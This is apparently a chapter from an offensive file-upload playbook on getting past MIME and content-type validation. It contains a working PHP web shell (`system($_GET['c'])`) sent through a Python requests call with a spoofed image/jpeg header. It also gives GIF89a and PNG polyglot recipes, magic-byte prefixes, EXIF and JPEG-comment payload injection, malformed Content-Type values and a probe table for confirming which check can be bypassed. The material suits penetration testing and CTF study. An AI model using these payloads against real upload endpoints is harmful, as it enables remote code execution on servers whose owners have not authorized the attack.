# MIME / Content-Type Bypass — defeating type checks at every layer

## The three "MIME" checks — know which one fired

An upload carries **three independent type claims**, and a validator may
trust any of them:

```
Content-Disposition: form-data; name="f"; filename="shell.php"
Content-Type: image/jpeg                       ← (A) per-part header, client-claimed

GIF89a;<?php phpinfo(); ?>                     ← (B) magic bytes, sniffed
shell.php                                       ← (C) extension→mime map
```

| Layer | Reads | Bypass |
|---|---|---|
| per-part `Content-Type` header | (A) | set it to anything whitelisted |
| server sniffing (`finfo`, `file -b`, `imghdr`, `python-magic`) | (B) | real magic bytes / polyglot |
| extension→MIME mapping | (C) | `extension-bypass.md` |

A `415` rejection usually means (A) or (B); a `400` "extension" message is (C).

## Per-part Content-Type header — the free spoof

The per-part `Content-Type` inside the multipart body is 100%
client-controlled. Send `filename="shell.php"` with
`Content-Type: image/jpeg` and the body `<?php ... ?>` — a validator that
reads only the header passes it.

```bash
python3 - <<'PY'
import requests
r = requests.post("$BASE/upload", files={
  "f": ("shell.php", b"<?php system($_GET['c']); ?>", "image/jpeg")
})
PY
```

Requests' `files=` tuple `(name, content, content_type)` writes the per-part
header directly — this is the whole bypass.

## Sniffed-type spoofing — feed the sniffer what it wants

`finfo_file`/`file -b --mime-type`/`python-magic` look at leading bytes:

| Wanted type | Leading bytes | Trick |
|---|---|---|
| image/gif | `GIF87a` / `GIF89a` | prefix payload; PHP ignores text before `<?php` |
| image/png | `89 50 4E 47 0D 0A 1A 0A` | real 8-byte PNG sig + payload appended |
| image/jpeg | `FF D8 FF` | prefix; insert payload in a COM segment for strict parsers |
| application/pdf | `%PDF-` | `%PDF-1.5\n` + payload — PDF readers are tolerant of trailing junk |
| application/zip | `PK\x03\x04` | real zip (payload inside); zip readers scan tail — see polyglot |
| image/webp | `RIFF....WEBP` | RIFF header + `WEBP` tag at offset 8 |
| image/bmp | `BM` + size fields | `BM` + plausible header + payload |
| video/*, audio/* | `ftyp`, `ID3`, `OggS` | see `video-audio-attacks.md` |

**GIF89a is the MVP**: `GIF89a;\n<?php payload ?>` is simultaneously a
valid GIF header line to the sniffer AND a PHP file to the interpreter —
any check based on `finfo`/`imghdr`/`getimagesize` (weak forms) passes it.
`getimagesize` additionally wants valid image dimensions for `.png`/`.jpg`
— a real 1×1 image prefix, then payload appended.

## `getimagesize()`-grade checks — real image required

PHP `getimagesize`, Python `PIL.Image.open().verify()`, `imghdr`, and
`sharp.metadata()` parse enough structure to reject bare prefixes:

- **Use a real image + appended payload** — PHP executes despite trailing
  text after `?>`-less raw bytes? No — PHP parses the WHOLE file; bytes
  before `<?php` are output verbatim and binary garbage before `<?php` is
  fine. `cat real.png payload.php > poly.php.png` executes on a PHP map.
- **JPEG COM segment**: `FF D8 FF FE <len16> <payload>` inserts payload in
  a comment segment — survives strict JPEG parsers AND re-encode-
  preserving tools? No — re-encoding strips comments. For re-encode
  survival → `image-attacks.md` pixel methods.
- **PNG ancillary chunks**: insert payload in `tEXt`/`zTXt`/`iTXt` chunk —
  survives metadata-preserving pipelines, stripped by full re-encode.
- **EXIF**: `exiftool -Comment='<?php ...' in.jpg` — visible to EXIF-reading
  validators; stripped by `-strip`/re-encode.

## The charset/parameter confuse — valid MIME, weird params

```
Content-Type: image/jpeg;charset=utf-8     # trailing params some matchers choke on
Content-Type: Image/JPEG                 # case-sensitive validator misses
Content-Type: image/jpeg ;               # trailing semicolon/space
Content-Type: image/jpe+g                # suffix grammar confusion
Content-Type: image/jpeg\x00             # NUL in header (rarely survives)
Content-Type: image/gif;p=x              # param injection
```

Two `Content-Type` lines in one part (`Content-Type: application/x-php`
then `Content-Type: image/jpeg`) — parsers take first or last; the checker
and the storer may disagree → `parser-differentials.md`.

## Boundary & multipart tricks that change what the type-check sees

- Missing per-part `Content-Type` → sniffer-only path
- `Content-Type:` empty → some validators treat empty as pass
- Part name confusion: checker reads part `name="avatar"`, storer reads
  `name="file"` — two parts, whitelisted one first → `parser-differentials.md`

## Framework-specific MIME handling

| Framework | Check API | Weakness to test |
|---|---|---|
| PHP | `$_FILES['f']['type']` | client header — always spoofable; finfo on tmpfile is the real check |
| Express/multer | `fileFilter` sees `mimetype` | header-only; `file.mimetype` is client claim |
| Django | `content_type` attr on UploadedFile | header; `python-magic`/PIL for real check |
| Flask/Werkzeug | `file.content_type` | header; `stream` for real bytes |
| Spring | `MultipartFile.getContentType()` | header; Tika for real check |
| Rails | `content_type` on attachment | header; `Marcel`/`file` for sniffing |
| Laravel | `$file->getMimeType()` | sniffs! `getClientMimeType()` is the header — devs confuse them |

The Laravel trap is CTF-real: `getClientMimeType()` trusts the header,
`getMimeType()` sniffs. If source uses the client one, header spoof is
enough.

## When the MIME check is real (sniffed) — the pivot list

1. polyglot with whitelisted type (`polyglot-files.md`)
2. make the whitelisted type executable (`.htaccess`/`.user.ini`/misconfig
   → `server-configs.md`)
3. don't fight the type check — attack what parses the file
   (`second-order-processing.md`, `archive-attacks.md`, `image-attacks.md`,
   `document-attacks.md`, `svg-attacks.md`)
4. store, then include (phar://, LFI, template) → `execution-paths.md`

## Probe table — one upload per hypothesis

| Probe | Pass means |
|---|---|
| `shell.php` + `image/jpeg` header + php body | header-only trust — done |
| `GIF89a;` + php body as `shell.php` | extension is the only real gate → back to ext tricks |
| real png + appended php as `x.png` | stored verbatim? does it get re-fetched executed? |
| `x.png` real image + `application/x-php` header | which claim wins? |
| `x.php` + `image/png` + bad magic | sniffer present? |

## Falsifiers

- the sniffer is strict (full parse) AND re-encoding strips all controllable
  bytes AND the executable-extension and config angles are closed
- the file is never served and never parsed → `detection.md` falsifier

## Output to record

- which of the three type claims the validator trusts (with the probe that proved it)
- the spoof that passed (header value, magic prefix, or polyglot form)
